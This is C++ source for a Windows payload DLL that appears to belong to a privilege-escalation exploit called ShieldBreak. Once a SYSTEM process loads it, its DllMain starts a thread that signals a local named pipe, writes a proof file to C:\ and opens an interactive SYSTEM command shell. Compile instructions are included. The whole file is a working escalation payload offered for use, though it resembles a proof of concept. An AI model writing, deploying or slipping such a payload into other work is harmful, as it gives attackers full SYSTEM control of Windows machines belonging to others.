// Warden Win10 - Payload DLL for ShieldBreak
// When loaded by a SYSTEM process, connects back to named pipe
// and can spawn a SYSTEM shell

#include <windows.h>

#pragma comment(lib, "advapi32.lib")

void ReportSuccess() {
    // Method 1: Connect to named pipe
    HANDLE hPipe = CreateFileW(
        L"\\\\.\\pipe\\SHIELDBREAK_WIN10",
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL
    );

    if (hPipe != INVALID_HANDLE_VALUE) {
        // Get current username to prove we're SYSTEM
        wchar_t username[256] = { 0 };
        DWORD size = 256;
        GetUserNameW(username, &size);

        char msg[512];
        wsprintfA(msg, "SYSTEM SHELL - Running as: %ws", username);

        DWORD written;
        WriteFile(hPipe, msg, (DWORD)strlen(msg), &written, NULL);
        CloseHandle(hPipe);
    }

    // Method 2: Write proof file (always works)
    HANDLE hFile = CreateFileW(
        L"C:\\SHIELDBREAK_SYSTEM.txt",
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        wchar_t username[256] = { 0 };
        DWORD size = 256;
        GetUserNameW(username, &size);

        char proof[512];
        wsprintfA(proof, "ShieldBreak Win10 - SYSTEM Achieved!\r\nRunning as: %ws\r\nTimestamp: %d",
            username, GetTickCount());

        DWORD written;
        WriteFile(hFile, proof, (DWORD)strlen(proof), &written, NULL);
        CloseHandle(hFile);
    }

    // Method 3: Spawn visible SYSTEM cmd (if possible)
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.lpDesktop = (LPWSTR)L"WinSta0\\Default";

    wchar_t cmd[] = L"cmd.exe /k echo === SYSTEM SHELL === && whoami && echo. && cd C:\\ && cmd";

    CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
}

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);

        // Run in separate thread to avoid blocking DllMain
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReportSuccess, NULL, 0, NULL);
    }
    return TRUE;
}

// Compile as DLL:
// cl.exe /LD warden_win10.cpp /Fe:warden_win10.dll
